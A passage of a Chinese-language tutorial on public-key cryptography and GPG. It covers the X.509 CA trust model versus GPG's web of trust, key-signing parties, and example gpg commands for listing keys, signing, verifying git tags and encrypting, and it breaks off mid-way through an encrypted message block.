\u4e2d\u6709\u300c\u516c\u94a5\u300d\u548c\u300c\u79c1\u94a5\u300d\u4e24\u79cd\u5bc6\u94a5\uff0c\u5176\u4e2d\u79c1\u94a5\u53ef\u4ee5\u5bfc\u51fa\u516c\u94a5\uff0c\u4f46\u516c\u94a5\u65e0\u6cd5\u53cd\u63a8\u79c1\u94a5\u3002\u5982\u679c\u7528\u516c\u94a5\u52a0\u5bc6\u6570\u636e\u7684\u8bdd\uff0c\u90a3\u4e48\u53ea\u6709\u79c1\u94a5\u53ef\u4ee5\u89e3\u5bc6\uff1b\u5982\u679c\u4f7f\u7528\u79c1\u94a5\u7b7e\u540d\u6570\u636e\u7684\u8bdd\uff0c\u90a3\u4e48\u53ef\u4ee5\u9a8c\u7b7e\u540d\u3002 \u5bc6\u7801\u5b66\u8d26\u6237 \u987e\u540d\u601d\u4e49\uff0c\u901a\u5e38\u6211\u4eec\u4f1a\u5c06\u516c\u94a5\u516c\u5f00\u5730\u53d1\u5e03\uff0c\u4f5c\u4e3a\u81ea\u5df1\u8eab\u4efd\u7684\u4ee3\u8868\uff0c\u5c31\u597d\u50cf\u7528\u6237\u540d\u4e00\u6837\uff08\u867d\u7136\u662f\u4e00\u4e2a\u96be\u4ee5\u8bb0\u5fc6\u7684\u968f\u673a\u5b57\u7b26\u4e32\uff09\uff1b\u800c\u5c06\u79c1\u94a5\u79d8\u5bc6\u5730\u4fdd\u5b58\uff0c\u4f5c\u4e3a\u8eab\u4efd\u7684\u8bc1\u660e\uff0c\u5c31\u50cf\u5bc6\u7801\u4e00\u6837\u3002\u5982\u679c\u4e00\u4e2a\u8d26\u6237\u662f\u7531\u4e00\u4e2a\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\u5bf9\u6240\u4fdd\u62a4\u7684\uff0c\u90a3\u6211\u4eec\u79f0\u4e4b\u4e3a\u300c\u5bc6\u7801\u5b66\u8d26\u6237\u300d\uff0c\u6211\u4eec\u8eab\u8fb9\u5e38\u89c1\u7684\u5bc6\u7801\u5b66\u8d26\u6237\u5305\u62ec\uff1a SSL \u8bc1\u4e66\uff08\u7528\u4e8e HTTPS \u7b49\u52a0\u5bc6\u901a\u8baf\uff09 S/MIME \u8bc1\u4e66\uff08\u7528\u4e8e\u90ae\u4ef6\u52a0\u5bc6\u548c\u8ba4\u8bc1\uff09 SSH \u5bc6\u94a5\uff08\u7528\u4e8e\u767b\u5f55\u670d\u52a1\u5668\u7684\u51ed\u8bc1\uff09 Bitcoin \u94b1\u5305 GPG ID \u8fd9\u4e9b\u8d26\u6237\u548c\u6211\u4eec\u901a\u5e38\u6ce8\u518c\u7684\u4e92\u8054\u7f51\u670d\u52a1\u5f88\u4e0d\u4e00\u6837\uff0c\u5728\u6211\u4eec\u901a\u5e38\u6ce8\u518c\u7684\u4e92\u8054\u7f51\u670d\u52a1\u4e2d\uff0c\u4f60\u7684\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u7531\u7f51\u7ad9\u7684\u7ef4\u62a4\u8005\u7ba1\u7406\u7684\uff0c\u4f60\u4e3a\u8d26\u6237\u8bbe\u7f6e\u7684\u5bc6\u7801\u5e76\u6ca1\u6709\u771f\u7684\u7528\u6765\u52a0\u5bc6\u6570\u636e\uff0c\u800c\u53ea\u662f\u4e00\u79cd\u8bc1\u660e\u8d26\u6237\u6240\u6709\u6743\u7684\u51ed\u8bc1\uff0c\u5728\u6bcf\u6b21\u767b\u5f55\u65f6\u4f60\u5411\u7f51\u7ad9\u53d1\u9001\u5bc6\u7801\uff0c\u6765\u8bc1\u660e\u81ea\u5df1\u662f\u8d26\u6237\u7684\u6240\u6709\u8005\u3002\u4e00\u65e6\u4f60\u5fd8\u8bb0\u4e86\u5bc6\u7801\uff0c\u7f51\u7ad9\u7684\u7ef4\u62a4\u8005\u5728\u901a\u8fc7\u5176\u4ed6\u6e20\u9053\uff08\u90ae\u7bb1\u5730\u5740\u3001\u624b\u673a\u53f7\u7801\uff09\u786e\u8ba4\u4e86\u4f60\u7684\u8eab\u4efd\u4e4b\u540e\uff0c\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u4f60\u91cd\u7f6e\u5bc6\u7801\u3002 \u800c\u5728\u5bc6\u7801\u5b66\u8d26\u6237\u4e2d\uff0c\u4f60\u62e5\u6709\u8d26\u6237\u7684\u552f\u4e00\u51ed\u8bc1\u5c31\u662f\u4f60\u7684\u5bc6\u94a5\u5bf9 \u2014\u2014 \u901a\u5e38\u662f\u8ba1\u7b97\u673a\u4e0a\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f60\u901a\u8fc7\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u94a5\u5bf9\u8fdb\u884c\u7b7e\u540d\u6765\u7ba1\u7406\u4f60\u7684\u8d26\u6237\u3001\u8fdb\u884c\u89e3\u5bc6\u6765\u8bbf\u95ee\u673a\u5bc6\u6570\u636e\u3002\u5bc6\u7801\u5b66\u8d26\u6237\u65e2\u662f\u66f4\u52a0\u5b89\u5168\u7684\uff08\u4e0d\u5b58\u5728\u5177\u6709\u7279\u6743\u7684\u7ba1\u7406\u8005\uff09\uff0c\u540c\u65f6\u4e5f\u662f\u66f4\u52a0\u5371\u9669\u7684\uff08\u4e00\u65e6\u4e22\u5931\u65e0\u6cd5\u627e\u56de\uff1b\u4e00\u65e6\u6cc4\u6f0f\u4e5f\u65e0\u6cd5\u91cd\u7f6e\uff09\u3002 \u516c\u94a5\u4ea4\u6362 \u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u770b\u4e0a\u53bb\u5f88\u7f8e\u597d\uff0c\u4e00\u65e6\u6211\u4eec\u6709\u4e86\u5bf9\u65b9\u7684\u516c\u94a5\uff0c\u53ea\u9700\u5728\u901a\u8baf\u65f6\u7528\u5bf9\u65b9\u7684\u516c\u94a5\u52a0\u5bc6\u6570\u636e\uff0c\u5c31\u4e07\u65e0\u4e00\u5931\u4e86\uff0c\u4f46\u8fd9\u5176\u4e2d \u6700\u8584\u5f31\u7684\u4e00\u4e2a\u73af\u8282\u5c31\u662f\u300c\u5f97\u5230\u5bf9\u65b9\u7684\u516c\u94a5\u300d\uff0c\u5373\u300c\u516c\u94a5\u4ea4\u6362\u300d \u3002 \u4e0a\u56fe\u662f\u7406\u60f3\u7684\u60c5\u51b5\uff0cA \u548c B \u4e92\u76f8\u4e4b\u95f4\u4ea4\u6362\u516c\u94a5\uff0c\u540e\u7eed\u7684\u901a\u8baf\u5c31\u53ef\u4ee5\u4ee5\u52a0\u5bc6\u7684\u65b9\u5f0f\u8fdb\u884c\u4e86\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u51fa\u73b0\u4e86\u4e00\u4e2a\u80fd\u591f\u76d1\u542c\u548c\u7be1\u6539 A \u548c B \u4e4b\u95f4\u7684\u901a\u8baf\u7684 C\uff0c\u7136\u540e\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u53d1\u7ed9 A \u548c B\uff0c\u5c31\u53d8\u6210\u4e86\u8fd9\u6837\uff1a A \u548c B \u90fd\u4ee5\u4e3a\u81ea\u5df1\u5f97\u5230\u4e86\u5bf9\u65b9\u7684\u516c\u94a5\uff0c\u4f46\u5b9e\u9645\u4e0a\u4ed6\u4eec\u5f97\u5230\u7684\u90fd\u662f\u4e2d\u95f4\u4eba C \u7684\u516c\u94a5\uff0c\u8fd9\u610f\u5473\u7740\u4ed6\u4eec\u4e4b\u540e\u7684\u901a\u8baf\u90fd\u4f1a\u4ee5 C \u7684\u516c\u94a5\u6765\u52a0\u5bc6\uff0cC \u4fbf\u53ef\u4ee5\u5728\u4e2d\u95f4\u7ee7\u7eed\u8fdb\u884c\u7a83\u542c\u548c\u7be1\u6539\u3002 \u6240\u4ee5\u5728\u7406\u8bba\u4e0a \u4e0d\u53ef\u80fd\u5b58\u5728\u4e00\u79cd\u5728\u7ebf\u7684\u3001\u53ef\u9760\u7684\u3001\u4e0d\u4e8b\u5148\u534f\u5546\u7684\u516c\u94a5\u4ea4\u6362\u673a\u5236 \uff0c\u56e0\u4e3a\u4ea4\u6362\u516c\u94a5\u610f\u5473\u7740\u53cc\u65b9\u8fd8\u6ca1\u6709\u5f00\u59cb\u52a0\u5bc6\u901a\u8baf\uff0c\u4ea4\u6362\u7684\u8fc7\u7a0b\u81ea\u7136\u6ca1\u6709\u4fdd\u969c\u3002\u90a3\u4e48\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u6211\u4eec\u662f\u5982\u4f55\u89e3\u51b3\u516c\u94a5\u4ea4\u6362\u7684\u95ee\u9898\u7684\u5462\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b SSL \u6240\u4f7f\u7528\u7684 X.509 \u8bc1\u4e66\u4f53\u7cfb\uff1a \u5728 X.509 \u4e2d\u6709\u4e00\u4e2a\u88ab\u79f0\u4e3a\u300c\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u300d\u7684\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\uff0cCA \u7684\u6570\u91cf\u8f83\u4e3a\u6709\u9650\uff0c\u8d44\u683c\u53d8\u5316\u4e5f\u5e76\u4e0d\u9891\u7e41\uff0c\u6240\u6709\u6d4f\u89c8\u5668\uff08browser\uff09\u90fd\u5185\u7f6e\u4e86 CA \u7684\u516c\u94a5\u3002\u800c\u7f51\u7ad9\u65b9\uff08website\uff09\u5728\u751f\u6210\u4e86\u81ea\u5df1\u7684\u516c\u94a5\u540e\uff0c\u9700\u8981\u5148\u627e CA \u5bf9\u81ea\u5df1\u7684\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\u7136\u540e\u624d\u80fd\u4f7f\u7528\u3002\u5f53\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e00\u4e2a\u65b0\u7684\u7f51\u7ad9\u65f6\uff0c\u7f51\u7ad9\u65b9\u9700\u8981\u63d0\u4f9b\u7ecf\u8fc7 CA \u7b7e\u540d\u7684\u516c\u94a5\uff0c\u6d4f\u89c8\u5668\u4f7f\u7528\u5185\u7f6e\u7684 CA \u516c\u94a5\u6765\u9a8c\u8bc1\u7b7e\u540d\uff0c\u786e\u4fdd\u6536\u5230\u7684\u7f51\u7ad9\u7684\u516c\u94a5\u6ca1\u6709\u88ab\u7be1\u6539\u8fc7\u3002 X.509 \u5b9e\u9645\u4e0a\u5c31\u662f\u8981\u6c42\u5927\u5bb6\u4fe1\u4efb\u4e00\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\u5e76\u5c06\u5b83\u4eec\u7684\u516c\u94a5\u5185\u7f6e\u5728\u5ba2\u6237\u7aef\u4e2d\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b8c\u7f8e\u7684\u65b9\u6848\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u4f53\u7cfb\u4e2d CA \u6709\u7740\u975e\u5e38\u5927\u7684\u6743\u529b\uff0c\u4e00\u65e6 CA \u4e0d\u6309\u7167\u89c4\u5219\u7b7e\u53d1\u8bc1\u4e66\uff0c\u90a3\u4e48\u5ba2\u6237\u7aef\u662f\u65e0\u6cd5\u5bdf\u89c9\u8fd9\u79cd\u653b\u51fb\u884c\u4e3a\u7684\u3002 GPG GPG \u662f PGP\uff08Pretty Good Privacy\uff09\u7684\u4e00\u4e2a GPL \u5b9e\u73b0\uff0c\u4e5f\u662f\u76ee\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u5b9e\u73b0\u3002 \u300c\u4fe1\u4efb\u4e00\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\u300d\u5bf9\u4e8e\u4e00\u4e9b\u53bb\u4e2d\u5fc3\u5316\u7231\u597d\u8005\u662f\u65e0\u6cd5\u63a5\u53d7\u7684\uff1a\u9996\u5148\u6211\u4eec\u51ed\u4ec0\u4e48\u53bb\u4fe1\u4efb\u8fd9\u4e2a\u7b2c\u4e09\u65b9\uff0c\u5176\u6b21\u5728 CA \u7533\u9886\u8bc1\u4e66\u901a\u5e38\u4e5f\u662f\u9700\u8981\u4ed8\u8d39\u7684\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u53ef\u80fd\u53bb\u9664\u8fd9\u4e2a\u6743\u5a01\u7684\u7b2c\u4e09\u65b9\uff0c\u800c\u5141\u8bb8\u5927\u5bb6\u4e92\u76f8\u8fdb\u884c\u8ba4\u8bc1\u5462\uff1f\u5982\u4f55\u786e\u8ba4\u4e00\u4e2a\u516c\u94a5\u5c31\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u4eba\u7684\u5462\uff1f\u8fd9\u5c31\u662f\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u4ecb\u7ecd\u7684 GPG \u7684\u4fe1\u4efb\u6a21\u578b\uff1a \u5728 GPG \u7684\u4fe1\u4efb\u6a21\u578b\u4e2d\uff0c\u7528\u6237\u4e92\u76f8\u4e4b\u95f4\u5bf9\u516c\u94a5\u8fdb\u884c\u8ba4\u8bc1\uff08\u901a\u8fc7\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u8fdb\u884c\u7b7e\u540d\u7684\u65b9\u5f0f\uff09\uff0c\u4f8b\u5982 Alice \u548c Bob \u662f\u5f88\u597d\u7684\u670b\u53cb\uff0c\u8981\u4e48 Alice \u5c31\u4f1a\u7528\u81ea\u5df1\u79c1\u94a5\u7ed9 Bob \u7684\u516c\u94a5\u7b7e\u540d\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u7b7e\u540d\u901a\u8fc7 Key Server \u5e7f\u64ad\u7ed9\u5176\u4ed6\u4eba\u3002Key Server \u4ec5\u4ec5\u7528\u6765\u4ea4\u6362\u516c\u94a5\u548c\u7b7e\u540d\uff0c\u56e0\u4e3a\u7b7e\u540d\u672c\u8eab\u662f\u53ef\u6821\u9a8c\u7684\uff0c\u6240\u4ee5 Key Server \u5e76\u6ca1\u6709\u4efb\u4f55\u7279\u6743\u3002 \u5f53\u53e6\u5916\u4e00\u4e2a Alice \u7684\u670b\u53cb\u770b\u5230 Bob \u7684\u516c\u94a5\uff0c\u5e76\u4e14\u53d1\u73b0 Alice \u7ed9 Bob \u7684\u516c\u94a5\u7b7e\u8fc7\u540d\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u4ed6\u7684\u670b\u53cb Alice \u5df2\u7ecf\u68c0\u67e5\u8fc7 Bob \u7684\u516c\u94a5\u4e86\uff0c\u5982\u679c\u770b\u5230\u66f4\u591a\u670b\u53cb\u7ed9 Bob \u7b7e\u8fc7\u540d\uff0c\u90a3\u4e48\u5c31\u51e0\u4e4e\u53ef\u4ee5\u8ba4\u5b9a Bob \u7684\u8eab\u4efd\u662f\u771f\u5b9e\u7684\u3002 \u6240\u4ee5 GPG \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u7531\u300c\u719f\u4eba\u5173\u7cfb\u300d\u5efa\u7acb\u8d77\u7684\u4fe1\u4efb\u7f51\u7edc\uff0c\u5f53\u4f60\u8ba4\u53ef\u4e00\u4e2a\u4eba\u7684\u8eab\u4efd\uff0c\u5373\u8ba4\u53ef\u8fd9\u4e2a\u516c\u94a5\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u4eba\u7684\uff0c\u4f60\u4fbf\u53ef\u4ee5\u7ed9\u4ed6\u7684\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\uff0c\u5f62\u6210\u4e00\u79cd\u4fe1\u4efb\u5173\u7cfb\uff0c\u540c\u65f6\u8fd9\u79cd\u4fe1\u4efb\u5173\u7cfb\u53c8\u662f\u53ef\u4ee5\u4f20\u9012\u7684\u3002\u5f53\u4f60\u7684 GPG \u901a\u8baf\u5f55\u4e2d\u6709\u4e86\u4e00\u4e9b\u4e92\u76f8\u4fe1\u4efb\u7684\u670b\u53cb\u4e4b\u540e\uff0c\u4fbf\u53ef\u57fa\u4e8e\u8fd9\u4e2a\u5173\u7cfb\u7f51\u6765\u62d3\u5c55\u4f60\u7684\u670b\u53cb\u5708\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u524d\u9762\u63d0\u5230\u4e0d\u53ef\u80fd\u6709\u4e00\u4e2a\u5728\u7ebf\u7684\u3001\u53ef\u9760\u7684\u3001\u4e0d\u4e8b\u5148\u534f\u5546\u7684\u516c\u94a5\u4ea4\u6362\u673a\u5236\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4fe1\u4efb\u7f51\u7edc\u5728\u4e00\u5f00\u59cb\u662f\u5982\u4f55\u5efa\u7acb\u8d77\u6765\u7684\u5462\uff1f\u7b54\u6848\u662f\u4f7f\u7528\u5206\u6563\u7684\u3001\u591a\u6e20\u9053\u7684\u3001\u53ef\u80fd\u662f\u7ebf\u4e0b\u7684\u65b9\u5f0f\u6765\u4ea4\u6362\u548c\u786e\u8ba4\u516c\u94a5\u3002\u5982\u679c\u4f7f\u7528\u4e00\u4e2a\u56fa\u5b9a\u7684\u534f\u8bae\u53bb\u4ea4\u6362\u516c\u94a5\uff0c\u800c\u4e14\u8fd9\u4e2a\u534f\u8bae\u672c\u8eab\u6ca1\u6709\u52a0\u5bc6\u4fdd\u62a4\uff0c\u90a3\u4e48\u5f53\u7136\u5bb9\u6613\u88ab\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f46\u5982\u679c\u4e24\u4e2a\u4eba\u540c\u65f6\u4f7f\u7528\u591a\u79cd\u6e20\u9053\u6765\u4ea4\u6362\u516c\u94a5\uff0c\u4f8b\u5982\u5148\u7528\u90ae\u4ef6\u53d1\u4e00\u6b21\u3001\u518d\u7528\u5fae\u4fe1\u53d1\u4e00\u6b21\u3001\u6700\u540e\u518d\u7528\u7535\u8bdd\u8bf4\u4e00\u6b21\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6e20\u9053\u540c\u65f6\u88ab\u653b\u51fb\u7684\u53ef\u80fd\u6027\u4f1a\u975e\u5e38\u5c0f\u3002 \u6216\u8005\u66f4\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7ebf\u4e0b\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u786e\u8ba4\uff0c\u5b9e\u9645\u4e0a\u5f88\u591a\u6280\u672f\u7c7b\u4f1a\u8bae\u7ed3\u675f\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a Key Signing Party \u7684\u6d3b\u52a8\uff0c\u5927\u5bb6\u9762\u5bf9\u9762\u5730\u786e\u8ba4\u8eab\u4efd\uff08\u4f60\u53ef\u80fd\u6709\u5fc5\u8981\u51fa\u793a\u5370\u6709\u7167\u7247\u7684\u8bc1\u4ef6\uff0c\u4f8b\u5982\u8eab\u4efd\u8bc1\u6216\u62a4\u7167\uff09\uff0c\u7528\u7eb8\u548c\u7b14\u8bb0\u4e0b\u516c\u94a5\uff0c\u7136\u540e\u56de\u5bb6\u8fdb\u884c\u7b7e\u540d\u548c\u4e0a\u4f20\u3002 \u6700\u540e\u4f60\u4fbf\u5f97\u5230\u4e86\u4e00\u4e9b\u6765\u81ea\u5176\u4ed6\u4eba\u7b7e\u540d\uff0c\u4ee3\u8868\u4ed6\u4eec\u8ba4\u53ef\u4e86\u4f60\u7684\u8eab\u4efd\uff0c\u5373\u8ba4\u53ef\u4e86\u67d0\u4e00\u4e2a GPG \u516c\u94a5\u4ee3\u8868\u4e86\u4f60\u3002 GPG \u901a\u8baf\u7c3f \u56e0\u4e3a GPG \u9700\u8981\u7528\u6237\u81ea\u5df1\u7ef4\u62a4\u4fe1\u4efb\u5173\u7cfb\uff0c\u56e0\u6b64\u6bcf\u4e2a GPG \u7684\u7528\u6237\u90fd\u4f1a\u6709\u4e00\u4e2a\u901a\u8baf\u7c3f\uff0c\u91cc\u9762\u662f\u5927\u91cf\u7684\u516c\u94a5\uff08\u4ee3\u8868\u7740\u4e00\u4e2a\u5176\u4ed6\u7528\u6237\uff09\u548c\u7b7e\u540d\uff08\u4ee3\u8868\u7740\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u4e0b\u9762\u662f\u6211\u7684\u901a\u8baf\u5f55\u4e2d\u4e0e\u6211\u81ea\u5df1\u76f8\u5173\u7684\u90e8\u5206\uff1a ~> gpg --list-keys jysperm pub 4096R/E466CF1E 2014-11-23 [expires: 2017-05-17] uid [ultimate] Wang Ziting <jysperm@gmail.com> uid [ultimate] Wang Ziting <jysperm@icloud.com> uid [ultimate] [jpeg image of size 1476] sub 2048R/1D795875 2014-11-23 [expires: 2017-05-17] sub 2048R/289286B3 2014-11-23 [expires: 2017-05-17] sub 2048R/35B5DE4D 2016-05-17 [expires: 2017-05-17] \u5176\u4e2d E466CF1E \u662f\u6211\u7684\u300c\u6839\u516c\u94a5\u300d\u7684\u7b80\u5199\u5f62\u5f0f\uff0c 4096R \u8868\u793a\u8fd9\u662f\u4e00\u4e2a 4096 bit \u7684 RSA \u5bc6\u94a5\u5bf9\uff0c\u521b\u5efa\u65f6\u95f4\u662f 2014-11-23 \uff0c\u6709\u6548\u671f\u81f3 2017-05-17 \u3002\u4e00\u4e2a GPG \u5e10\u53f7\u4e0b\u53ef\u4ee5\u6709\u591a\u4e2a uid\uff0c\u6211\u53ef\u4ee5\u4f7f\u7528\u6839\u516c\u94a5\u7b7e\u7f72\u7c7b\u4f3c\u4e8e\u300c jysperm@gmail.com \u662f\u6211\u7684\u90ae\u7bb1\u5730\u5740\u300d\u7684\u7b7e\u540d\uff0c\u6765\u5c06\u81ea\u5df1\u7684\u591a\u4e2a\u8eab\u4efd\u5173\u8054\u5230\u4e00\u8d77\uff0c\u4e0a\u9762\u7684 3 \u4e2a uid \u5373\u6211\u7684 2 \u4e2a\u90ae\u7bb1\u5730\u5740\u548c\u4e00\u4e2a\u5934\u50cf\u56fe\u7247\u3002 \u6211\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6839\u516c\u94a5\u7b7e\u7f72\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u300c\u6211\u6388\u6743 1D795875 \u4e3a\u6211\u7684\u5b50\u5bc6\u94a5\uff0c\u53ef\u4ee5\u4ee3\u66ff\u6211\u8fdb\u884c\u7b7e\u540d\u7b49\u64cd\u4f5c\u300d\u7684\u6d88\u606f\u6765\u6dfb\u52a0\u989d\u5916\u7684\u5b50\u5bc6\u94a5\uff0c\u4f8b\u5982\u4e0a\u9762\u7684\u4e09\u4e2a sub \u5c31\u662f\u4e09\u4e2a\u4e0d\u540c\u529f\u80fd\u7684\u5b50\u5bc6\u94a5\u3002\u5c31\u50cf\u8fd9\u6837\uff0c\u5176\u5b9e\u5bf9\u4e8e GPG \u5e10\u53f7\u7684\u7ba1\u7406\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u7528\u79c1\u94a5\u7b7e\u540d\u6d88\u606f\u6765\u5b9e\u73b0\u7684\u3002 \u8fd8\u53ef\u4ee5\u5217\u51fa\u4e0e\u6211\u6709\u5173\u7684\u7b7e\u540d\uff1a ~> gpg --list-sigs jysperm pub 4096R/E466CF1E 2014-11-23 [expires: 2017-05-17] uid Wang Ziting <jysperm@gmail.com> sig C07CFB96 2016-05-04 paomian <qtang@leancloud.rocks> sig 3 7CDC82A7 2015-05-11 Yeechan Lu <wz.bluesnow@gmail.com> sig 3 E466CF1E 2016-05-17 Wang Ziting <jysperm@gmail.com> sig E411E711 2016-06-02 keybase.io/librazy <librazy@keybase.io> sig B0B002B8 2016-07-13 dennis (Dennis Zhuang) <killme2008@gmail.com> \u8fd9\u91cc\u770b\u5230\u9664\u4e86\u6211\u81ea\u5df1\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u56db\u4e2a\u4eba\u4e3a\u6211 [ jysperm@gmail.com](mailto: jysperm@gmail.com) \u8fd9\u4e2a uid \u8fdb\u884c\u4e86\u7b7e\u540d\uff0c\u8ba4\u53ef\u4e86 E466CF1E \u8fd9\u4e2a\u516c\u94a5\u5c5e\u4e8e Wang Ziting jysperm@gmail.com ` \u8fd9\u4e2a\u4eba\u3002\u5bf9\u4ed6\u4eba\u7684\u7b7e\u540d\u4e5f\u662f\u53ef\u4ee5\u533a\u5206\u4e0d\u540c\u7684\u7ea7\u522b\u7684\uff0c\u4f8b\u5982\u5bf9\u4e8e\u300c\u5728\u8bba\u575b\u4e0a\u6df7\u4e86\u4e2a\u8138\u5c5e\u300d\u548c\u300c\u6bcf\u5929\u90fd\u89c1\u9762\u7684\u540c\u4e8b\u300d\u4f60\u53ef\u4ee5\u7ed9\u4e88\u4e0d\u540c\u7ea7\u522b\u7684\u7b7e\u540d\u6765\u66f4\u51c6\u786e\u5730\u8868\u8fbe\u4fe1\u4efb\u5173\u7cfb \u4f7f\u7528 GPG \u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86 GPG \u7684\u4fe1\u4efb\u6a21\u578b\u548c\u901a\u8baf\u7c3f\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u54ea\u4e9b\u573a\u666f\u4e0b\u4f7f\u7528 GPG \u5462\uff1f \u9996\u5148\u662f\u4f60\u53ef\u4ee5\u7528\u5b83\u7b7e\u540d\u4e00\u6bb5\u6d88\u606f\uff1a ~> echo 'hello' | gpg --clearsign -a -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 hello -----BEGIN PGP SIGNATURE----- iQIcBAEBAgAGBQJXfifAAAoJELQPOvDkZs8epZAP/3/jP6k1Dev2a8i8KfY7VDfv TVGl61kLEbgpgR3mWXFL7PaJ8SyW8N0Dv3cJhYbY8NGp8wbkZa7cUS7DkTb2ArhS M+IKUJtwUwbfp5fOyT+esaDLWatqjSJ+5IjWX8BOnh5SnLNMURDxsYrJMShfecTD tbBfnEkIeCFBwIfE0Xs5m23+6i7t77ZgLdn1qpWLTRNpd6Fzi0B653Kr8dREPflI MAsn6CP90pX55V0LnsZGiAgZV+34iFolhFDd7N5mtPT/zF7OToN2SNJF3YOVikBp M+1WJL9W8x9DwzhOq8AmPgHIEwBZVNS8Nv+UNadIZJuexR0ERl64e8MdTLft0Qui ChjUiD7ibkLR433jcms+2EJ04xd6Ie0mp/nH5nMLY1mEgHtLMXql6VHQCbJt80Vf ZrL2J+BF9Sk1zPh9Hn5NGe+RLX1d/CZ62rYMICRcEwiS9vpWq6m9ouSMNZUYr8S5 a/ooD6gc71t457pVgkMqjo3Auazf4PRilUsAraQZilr+8yPhciE/PX3gBL5CtKHJ 4vKH9P9RngigL6D+YyBB5vMcpXlhx9ShbH2qLr106adJ1XrCpGtSmfxygjRn3xX9 Q1dWUaELUahhcdtK6IwZ6qzyp9AESpSd+Z/bnV7jc8iC0VtMOXipVnMo7J5qyHKD /+yt8/tzoC4+0MEzlaHJ =aOto -----END PGP SIGNATURE----- \u4e0a\u9762\u6211\u4eec\u5148\u7528 SHA1 \u5bf9\u8981\u7b7e\u540d\u7684\u6587\u672c\u8fdb\u884c\u8fdb\u884c\u4e86\u4e00\u4e0b\u6458\u8981\uff0c\u7136\u540e\u7528 GPG \u5bf9\u8fd9\u4e2a\u6458\u8981\u8fdb\u884c\u4e86\u7b7e\u540d\u3002 \u56e0\u4e3a Git \u4e2d\u7684\u7528\u6237\u540d\u548c\u90ae\u4ef6\u5730\u5740\u5176\u5b9e\u662f\u53ef\u4ee5\u968f\u610f\u66f4\u6539\u7684\uff0c\u4e4b\u524d\u6709\u8fc7\u51e0\u6b21\u4f2a\u9020 Commit \u5192\u5145\u5927 V \u7684\u4e8b\u4ef6\u53d1\u751f\u3002\u6700\u8fd1 GitHub \u652f\u6301\u4e86\u4e3a\u5e10\u53f7\u914d\u7f6e GPG \u516c\u94a5\uff0c\u7136\u540e\u4f60\u4fbf\u53ef\u4ee5\u5728\u53d1\u5e03\u65b0\u7248\u672c\u7684\u65f6\u5019\u7528 git tag -s v1.0.0 \u8fdb\u884c\u7b7e\u540d\uff1a \u4f60\u53ef\u4ee5\u5728\u672c\u5730\u8fd9\u6837\u6765\u9a8c\u8bc1\u7b7e\u540d\uff0c\u4e00\u65e6\u7b7e\u540d\u8ba4\u8bc1\u901a\u8fc7\uff0c\u548c\u6b63\u786e\u7684 GPG \u5e10\u53f7\u7ba1\u7406\uff0c\u90a3\u4e48\u8fd9\u4e2a Commit \u5c31\u4e0d\u53ef\u80fd\u662f\u4f2a\u9020\u7684\uff1a ~> git tag -v v1.1.0 object b0e42636df7394ac34f2b61c589233d0c3296d10 type commit tag v1.1.0 tagger jysperm <jysperm@gmail.com> 1467084786 +0800 gpg: Signature made 6/28 11:33:17 2016 CST gpg: using RSA key B40F3AF0E466CF1E gpg: Good signature from \"Wang Ziting <jysperm@gmail.com>\" \u5f88\u591a\u5f00\u6e90\u8f6f\u4ef6\u5728\u53d1\u5e03\u65b0\u7248\u672c\u7684\u4e8c\u8fdb\u5236\u5305\u65f6\u4e5f\u4f1a\u4f7f\u7528 GPG \u8fdb\u884c\u7b7e\u540d\uff0c\u5305\u62ec Debian \u7684\u8f6f\u4ef6\u4ed3\u5e93 apt \u4e5f\u662f\u901a\u8fc7 GPG \u8fdb\u884c\u7b7e\u540d\u7684\u3002 \u7136\u540e\u4f60\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528 GPG \u52a0\u5bc6\u6d88\u606f\uff1a ~> echo 'hello' | gpg --encrypt -a -r jysperm -----BEGIN PGP MESSAGE----- hQEMAyp325QokoazAQf8DDqELYisLFSGo/9Gblr1MEabb9t3V3AcbWkA4uimpYeD /DTWDlmxrIsvpmDDeV/1bAZ/gMc2DzhODfM4PQf8DfD+lvHwgMBhe1zSBCZlQwkj 